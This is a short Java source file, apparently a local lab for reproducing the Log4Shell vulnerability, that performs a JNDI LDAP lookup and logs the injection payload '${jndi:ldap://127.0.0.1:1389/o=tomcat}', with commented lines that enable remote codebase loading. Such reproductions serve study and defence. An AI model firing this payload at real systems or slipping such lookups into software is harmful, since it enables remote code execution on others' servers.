package com.mycompany.app;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.util.Properties; 
import java.util.Hashtable;
import javax.naming.*;
/**
 * Hello world!
 *
 */
public class App 
{
     public static void jndi(){
        
        try { 
            //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
            Properties props = new Properties(); 
            props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory"); 
            props.put(Context.PROVIDER_URL, "ldap://127.0.0.1:1389/"); 
            Context initialContext = new InitialContext(props); 
            String name="unimportant";
            Object obj = initialContext.lookup(name); 
        } 
        catch (NamingException nnfe) { 
            System.out.println(nnfe);
            System.out.println("Encountered a naming exception"); 
            } 
    }

    public static void log4j(){
        Logger logger = LogManager.getLogger(App.class.getName());
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload="${jndi:ldap://127.0.0.1:1389/o=tomcat}";
        logger.error(payload, "from log4j");

    }
}
